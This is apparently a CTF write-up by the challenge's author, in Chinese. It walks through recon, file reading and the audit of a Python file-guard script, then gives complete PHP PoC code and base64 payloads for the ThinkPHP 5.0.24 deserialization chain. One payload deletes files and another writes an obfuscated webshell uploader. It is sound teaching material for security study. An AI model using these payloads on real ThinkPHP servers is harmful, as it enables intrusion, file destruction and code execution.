这题出法本身属于比较偏实战的题目，题目环境也都是由实战渗透中改编而来，综合了前期的信息搜集，中期的代码审计，以及后期的实战渗透，大量的跳转模拟了实战中大量资产的统计，代码审计综合了Python与经典的Thinkphp5，实战渗透的细节决定了最后Getshell的问题。
根据赛题反馈情况来看，大部分选手采用了条件竞争的解法，这个属于预期解，不过没想到大家都在条件竞争，本题为了降低难度没有限制频率，实战环境正常来说是要结合频率限制的，另外Python脚本是本人朋友年轻时候写的不成熟代码，冗余代码（结合实际）审计起来的确挺恶心的，给大伙道个歉。
#### 信息搜集

访问链接/public，可以判断这属于tp5的系统结构
看到这个界面，发现该界面自动记录了访问者的ip，得到信息index.php，然后发现很快自动跳转到了localhost的public/test/，并且告诉了我们log.txt的存在
尝试点击各功能按钮，fuzz过后可以发现该界面属于纯html界面，没有功能，查看源代码
在源代码中发现提示，访问/public/nationalsb路由
发现一个登陆框，随便输入用户名密码，发现无发包，依然是纯html界面，在源代码中查看
在Js代码中发现了注释泄露的用户名密码信息
Admin1964752 DsaPPPP!@#amspe1221 login.php
401认证爆破，难点在于他没有拒绝认证，任何认证都会确认，每次删除认证头爆破密码。
如果输入错误的认证，会发现只有普通的信息，没有任何可用的点。
正确后获得一个$file的文件读取
尝试读取flag，发现无回显，很奇怪，猜测是ban了flag关键字
读取源代码，分别读取login.php，上一层目录的index.php，还有上一层的think文件
了解到是tp5.0.24
存在已知的反序列化rce漏洞
在文件读取中
读取application/index/controller/Index.php
发现反序列化入口点
thinkphp5.0.24反序列化rce漏洞参考：https://www.anquanke.com/post/id/196364
通过该点触发后，将会写马进入web目录，但是每次写马都会被删除，猜测有防御手段，这里是本题的精髓点，在实战中，经常有各种第三方防护手段，本题目的防御手段为一个Python的文件守护，需要通过逻辑漏洞导致该程序崩溃，然后才能写马。
在/public/log.txt中
提示文件存在protect.py
通过之前的文件读取获得protect.py的源代码
![](/uploads/upload_2ab01a1b4fa5ff6a8363a00e2505d384.png)

#### 代码审计

这部分参考了osword师傅的代码审计过程，感兴趣的可以学习一波
然后分析protect.py文件，该文件源码较长，代码逻辑混乱，需要较长时间的审计过程。
![](/uploads/upload_3b88ac40fdb6ec87e4e1b9458b15f235.png)
涉及函数
![](/uploads/upload_fb14926fa9ea52b3998745032a35ce8b.png)
目录缺失修复
![](/uploads/upload_9890f0c1fa704460b3270e176f0d6c97.png)
文件增改修复
![](/uploads/upload_d5c8e27f709093f15f0c8a4b8e6dd366.png)
文件删除修复
![](/uploads/upload_132da6f6b71f810aef77c1a15b46e5f0.png)
关键点如上，该部分代码存在一个文件流漏洞，高频的访问日志文件，导致文件流高频开启关闭，同时该部分代码没有用try except保护，这导致文件被删除后，该程序会抛出一个报错导致崩溃。
这里使用一个tp5.0.24的任意文件删除poc删除文件导致防御脚本崩溃
所有poc贴在最后

#### 获取flag


需要文件读取中获取的index.php源码了解到反序列化点为
![](/uploads/upload_fd505d58e7e6ce5bed04e2f9a10d3d59.png)
此处需要用一个base64加密过的poc进行反序列化
触发index/hello函数
触发方式为
http://127.0.0.1/public/index.php/index/index/hello?s3cr3tk3y
即可触发
同时要注意的点为，该反序列化poc需要用到php的短标签，如果该处未开启，该poc写的木马将无法运行
Poc如下:
delete_file.php:
```php
<?php
namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
private $files = [];
public function __construct()
{
$this->files=['router.php'];
}
}
echo base64_encode(serialize(new Windows()));
```
这里注意，防御脚本不检测任何txt文件，删除一个其他后缀名文件即可。
POC：
TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtzOjEwOiJyb3V0ZXIucGhwIjt9fQ==
poc.php
```php
<?php
namespace think\process\pipes{
    class Windows{
        private $files = [];
        function __construct($a){
            $this->files=[$a];
        }
    }
}
namespace think{
    abstract class Model{
}
}
namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
        public $parent;
        protected $append = [];
        protected $data = [];
        protected $error;
        function __construct($parent,$error){
            $this->parent=$parent;
            $this->append = ["getError"];
            $this->data =['123'];
            $this->error=(new model\relation\HasOne($error));
        }
    }
   
}
namespace think\model\relation{
    use think\model\Relation;
    class HasOne extends OneToOne{
       
    }
}
namespace think\mongo{
    class Connection{
    }
}
namespace think\model\relation{
    abstract class OneToOne{
        protected $selfRelation;
        protected $query;
        protected $bindAttr = [];
        function __construct($query){
            $this->selfRelation=0;
            $this->query=$query;
            $this->bindAttr=['123'];
        }
    }
    }
namespace think\console{
    class Output{
        private $handle = null;
        protected $styles = [
            'getAttr'
        ];
        function __construct($handle){
            $this->handle=$handle;
        }
    }
}
namespace think\session\driver{
    class Memcached{
        protected $handler = null;
        function __construct($handle){
            $this->handler=$handle;
        }
    }
   
}
namespace think\cache\driver
{
    class File{
        protected $options = [
            'expire'        => 3600,
            'cache_subdir'  => false,#encode
            'prefix'        => '',#convert.quoted-printable-decode|convert.quoted-printable-decode|convert.base64-decode/
            'path'          => 'php://filter//convert.iconv.UCS-2LE.UCS-2BE/resource=?<hp pn$ma=e_$EG[Tf"li"e;]f$li=e_$EG[Td"wo"n;]ifelp_tuc_noettn(sn$ma,eifelg_tec_noettn(sf$li)e;)ihhgilhg_tifel_(F_LI_E)_?;a>a/../',
            'data_compress' => false,
        ];
        protected $tag='123';
    }
}
namespace think\db{
    class Query{
        protected $model;
        function __construct($model){
            $this->model=$model;
        }
    }
}
namespace{
    $File = (new think\cache\driver\File());
    $Memcached = new think\session\driver\Memcached($File);
    $query = new think\db\Query((new think\console\Output($Memcached)));
    $windows=new think\process\pipes\Windows((new think\model\Pivot((new think\console\Output($Memcached)),$query)));
    echo base64_encode((serialize($windows)));
}
?>
```
POC
TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjE6e3M6MTA6IgAqAGhhbmRsZXIiO086MjM6InRoaW5rXGNhY2hlXGRyaXZlclxGaWxlIjoyOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjM2MDA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MTgyOiJwaHA6Ly9maWx0ZXIvL2NvbnZlcnQuaWNvbnYuVUNTLTJMRS5VQ1MtMkJFL3Jlc291cmNlPT88aHAgcG4kbWE9ZV8kRUdbVGYibGkiZTtdZiRsaT1lXyRFR1tUZCJ3byJuO11pZmVscF90dWNfbm9ldHRuKHNuJG1hLGVpZmVsZ190ZWNfbm9ldHRuKHNmJGxpKWU7KWloaGdpbGhnX3RpZmVsXyhGX0xJX0UpXz87YT5hLy4uLyI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjY6IgAqAHRhZyI7czozOiIxMjMiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX1zOjk6IgAqAGFwcGVuZCI7YToxOntpOjA7czo4OiJnZXRFcnJvciI7fXM6NzoiACoAZGF0YSI7YToxOntpOjA7czozOiIxMjMiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7aTowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7cjo1O3M6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319fXM6MTE6IgAqAGJpbmRBdHRyIjthOjE6e2k6MDtzOjM6IjEyMyI7fX19fX0
先删除任意非txt文件后直接上传php马即可获得flag
#### 条件竞争
大多数选手选择了条件竞争，那么也是相同的思路，一直生成一句话木马然后一直访问，这里就不过多阐述
